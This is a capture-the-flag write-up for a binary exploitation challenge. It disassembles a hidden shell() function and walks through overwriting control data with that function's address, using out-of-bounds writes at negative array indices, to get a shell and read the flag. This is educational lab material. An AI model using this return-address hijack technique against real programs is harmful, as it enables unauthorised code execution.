# Hack Index – (Pwn / Binary Exploitation)

### Challenge Description
> *"You can edit my array, but can you hack it?"*  
Category: Pwn (Binary Exploitation)  
Tool: Kali Linux  

We are given a binary that allows editing an array at arbitrary indices. The task is to exploit this to gain access to hidden functionality.

---

### Binary Analysis
Using **GDB** to disassemble the binary revealed a hidden function:

```asm
Dump of assembler code for function shell:
   0x080491c2 <+0>:    push   %ebp
   0x080491c3 <+1>:    mov    %esp,%ebp
   0x080491c5 <+3>:    sub    $0x8,%esp
   0x080491c8 <+6>:    call   0x804933b <__x86.get_pc_thunk.ax>
   0x080491cd <+11>:   add    $0x2e22,%eax
   0x080491d2 <+16>:   sub    $0x8,%esp
   0x080491d5 <+19>:   lea    -0xff8(%eax),%edx
   0x080491db <+25>:   mov    %edx,(%esp)
   0x080491de <+28>:   call   0x8049060 <system@plt>
   0x080491e3 <+33>:   nop
   0x080491e4 <+34>:   leave  
   0x080491e5 <+35>:   ret
```
### Key observations:
There is a function named shell() that calls system().
This function is not called during normal execution.
If we can overwrite the program’s return address (or function pointer) with the address of shell(), we can execute it.

### Exploitation Approach
1. Find shell() address
From GDB: 0x080491c2
Convert to decimal for input:
>python3 -c "print(int('0x080491c2', 16))"
→ 134517186

2. Use out-of-bounds array access
The program allows writing to arbitrary indices (including negative).
This lets us overwrite saved return addresses or function pointers.

3. Exploit steps
Enter index -2 or -1 (out-of-bounds).
Overwrite with 134517186 (address of shell).
Trigger program exit to hijack execution flow.

### Execution
```bash
$ ./chall
Enter the index to write at: -2
Enter the value to write: 134517186
Current buffer: 1 2 3 4 5 6 7 8

Enter the index to write at: -1
Enter the value to write: 134517186
Current buffer: 1 2 3 4 5 6 7 8

$ run.sh
cat flag.txt
flag{klKib5Bm0czV}
```

### Final Flag
>flag{klKib5Bm0czV}

### Lessons Learned
Always check for hidden functions (like shell()) in binaries — they’re common in pwn challenges.
Array out-of-bounds writes can overwrite critical control data (return addresses, function pointers).
Knowing the address of the target function (via disassembly) allows hijacking execution flow.
